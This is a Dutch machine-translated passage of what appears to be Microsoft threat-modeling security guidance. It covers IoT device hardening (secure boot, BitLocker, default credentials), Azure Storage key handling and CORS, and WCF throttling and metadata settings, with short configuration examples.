## <a id="unknown-exe"></a>Zorg ervoor dat onbekende code kan niet worden uitgevoerd op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Inschakelen van beveiligd opstarten en BitLocker Apparaatversleuteling op Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Stappen** | Beveiligd opstarten van UEFI Hiermee beperkt u het systeem om toe te staan alleen uitvoering van de binaire bestanden ondertekend door een opgegeven instantie. Deze functie voorkomt dat onbekende code wordt uitgevoerd op het platform en de beveiligingsstatus van deze mogelijk verzwakken. UEFI beveiligd opstarten inschakelen en beperken van de lijst met certificeringsinstanties die worden vertrouwd voor het ondertekenen van code. Meld u aan alle code die is geïmplementeerd op het apparaat met een van de vertrouwde basiscertificeringsinstanties. |

## <a id="partition-iot"></a>OS- en extra partities van IoT-apparaat met BitLocker versleutelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Windows 10 IoT Core implementeert een lichtgewicht versie van BitLocker Apparaatversleuteling, een sterke afhankelijkheid van de aanwezigheid van een TPM op het platform heeft, met inbegrip van de benodigde preOS-protocol in UEFI die de metingen die nodig zijn voert. Deze metingen preOS Zorg ervoor dat het besturingssysteem later een definitieve record van de manier waarop het besturingssysteem is gestart. Versleutelen OS partities BitLocker en eventuele extra partities ook in het geval ze alle gevoelige gegevens worden opgeslagen. |

## <a id="min-enable"></a>Zorg ervoor dat alleen de minimale services en-functies zijn ingeschakeld op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Niet inschakelen of uitschakelen van alle functies of services in het besturingssysteem die is niet vereist voor de werking van de oplossing. Voor bijvoorbeeld als het apparaat niet voor een gebruikersinterface vereist is te worden geïmplementeerd, installeert u Windows IoT Core in ' headless '-modus. |

## <a id="field-bit-locker"></a>OS- en extra partities van IoT-Veldgateway met BitLocker versleutelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Veld voor IoT-Gateway | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Windows 10 IoT Core implementeert een lichtgewicht versie van BitLocker Apparaatversleuteling, een sterke afhankelijkheid van de aanwezigheid van een TPM op het platform heeft, met inbegrip van de benodigde preOS-protocol in UEFI die de metingen die nodig zijn voert. Deze metingen preOS Zorg ervoor dat het besturingssysteem later een definitieve record van de manier waarop het besturingssysteem is gestart. Versleutelen OS partities BitLocker en eventuele extra partities ook in het geval ze alle gevoelige gegevens worden opgeslagen. |

## <a id="default-change"></a>Zorg ervoor dat de standaard-aanmeldingsreferenties van de veldgateway zijn gewijzigd tijdens de installatie

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Veld voor IoT-Gateway | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Zorg ervoor dat de standaard-aanmeldingsreferenties van de veldgateway zijn gewijzigd tijdens de installatie |

## <a id="cloud-firmware"></a>Zorg ervoor dat de Cloudgateway een proces implementeert voor de verbonden apparaten-firmware up-to-date te houden

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-Cloud-Gateway | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | Keuze van de gateway - Azure IoT Hub |
| **Verwijzingen**              | [Overzicht van IoT-Hub Apparaatbeheer](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [apparaatfirmware bijwerken](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **Stappen** | LWM2M is een protocol van de Open Mobile Alliance voor IoT-Apparaatbeheer. Azure IoT-Apparaatbeheer kunt om te communiceren met fysieke apparaten met behulp van apparaattaken. Zorg ervoor dat de Cloudgateway een proces implementeert voor het apparaat en andere configuratiegegevens up-to-date met behulp van Azure IoT Hub-Apparaatbeheer regelmatig te houden. |

## <a id="controls-policies"></a>Zorg ervoor dat apparaten eindpunt beveiligingsmechanismen geconfigureerd volgens organisatiebeleid hebben

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Vertrouwensgrenzen van computer | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Zorg ervoor dat apparaten eindpunt beveiligingsmaatregelen zoals BitLocker voor versleuteling in op de schijf, antivirusprogramma's met bijgewerkte handtekeningen hebben, gebaseerde firewall, upgrades voor het besturingssysteem host, groep beleid enz. aan de hand van beleidsregels voor beveiliging van de organisatie zijn geconfigureerd. |

## <a id="secure-keys"></a>Zorg ervoor dat veilig beheer van de toegangssleutels voor Azure storage

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Azure Storage | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Azure Storage-beveiligingshandleiding - uw Opslagaccountsleutels beheren](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Stappen** | <p>Opslag van sleutels: Het wordt aanbevolen voor het opslaan van de toegangssleutels voor Azure Storage in Azure Key Vault als een geheim en de toepassingen die de sleutel ophalen uit key vault. Dit wordt aanbevolen vanwege de volgende redenen:</p><ul><li>De toepassing heeft nooit de opslag sleutel vastgelegd in een configuratiebestand, waardoor deze doorverwezen iemand de toegang tot de sleutels zonder de uitdrukkelijke toestemming worden verwijderd</li><li>Toegang tot de sleutels kan worden beheerd met behulp van Azure Active Directory. Dit betekent dat de eigenaar van een account toegang kan verlenen tot het aantal toepassingen die u nodig hebt voor het ophalen van de sleutels uit Azure Key Vault. Andere toepassingen pas weer toegang krijgen tot de sleutels zonder deze machtiging verlenen specifiek</li><li>Sleutel opnieuw genereren: Het wordt aanbevolen dat een proces voor het opnieuw genereren van toegangssleutels voor Azure storage voor opmaaktalen wordt om beveiligingsredenen. Meer informatie over waarom en hoe u voor het plannen van sessiesleutels worden beschreven in het artikel Azure Storage-beveiligingshandleiding-verwijzing</li></ul>|

## <a id="cors-storage"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de Azure-opslag

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Azure Storage | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [CORS-ondersteuning voor de Azure Storage-Services](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Stappen** | Azure Storage kunt u CORS: Cross-Origin-resources delen inschakelen. U kunt domeinen die toegang hebben tot de resources in het storage-account opgeven voor elke storage-account. CORS is standaard uitgeschakeld op alle services. U kunt CORS inschakelen met behulp van de REST-API of de storage-clientbibliotheek om aan te roepen een van de methoden voor het instellen van de service-beleid. |

## <a id="throttling"></a>Beperking van de functie van WCF-service inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | WCF | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | .NET framework 3 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Voeg Koninkrijk](https://vulncat.fortify.com) |
| **Stappen** | <p>Niet het plaatsen van een limiet op het gebruik van systeembronnen kan leiden tot uitputting van bronnen en uiteindelijk een DoS-aanval.</p><ul><li>**UITLEG:** Windows Communication Foundation (WCF) biedt de mogelijkheid om te beperken van serviceaanvragen. Te veel aanvragen van clients zodat kunt overspoelen van een systeem en de bronnen. Aan de andere kant, zodat slechts een beperkt aantal aanvragen voor een service kunt voorkomen dat legitieme gebruikers met behulp van de service. Elke service moet afzonderlijk worden afgestemd op en geconfigureerd, zodat de juiste hoeveelheid resources.</li><li>**AANBEVELINGEN** van inschakelen WCF service functie en limieten instellen geschikt zijn voor uw toepassing.</li></ul>|

### <a name="example"></a>Voorbeeld
Hier volgt een voorbeeldconfiguratie met beperking ingeschakeld:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-informatie worden vrijgegeven via metagegevens

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | WCF | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | .NET framework 3 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Voeg Koninkrijk](https://vulncat.fortify.com) |
| **Stappen** | Metagegevens kunt aanvallers meer informatie over het systeem en plannen van een vorm van de aanval. WCF-services kunnen worden geconfigureerd als metagegevens beschikbaar wilt maken. Metagegevens biedt gedetailleerde beschrijving van informatie en niet in een productieomgeving moet worden verzonden. De `HttpGetEnabled`  /  `HttpsGetEnabled` eigenschappen van de klasse ServiceMetaData bepaalt of een service de metagegevens wordt weergegeven | 

### <a name="example"></a>Voorbeeld
Hiermee geeft u de onderstaande code WCF om uit te zenden van een service-metagegevens
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
De metagegevens in een productieomgeving niet worden uitgezonden. Stel de HttpGetEnabled / eigtenschap eigenschappen van de ServiceMetaData klasse op false. 

### <a name="example"></a>Voorbeeld
De onderstaande code geïnstrueerd WCF om uit te zenden geen metagegevens van een service. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
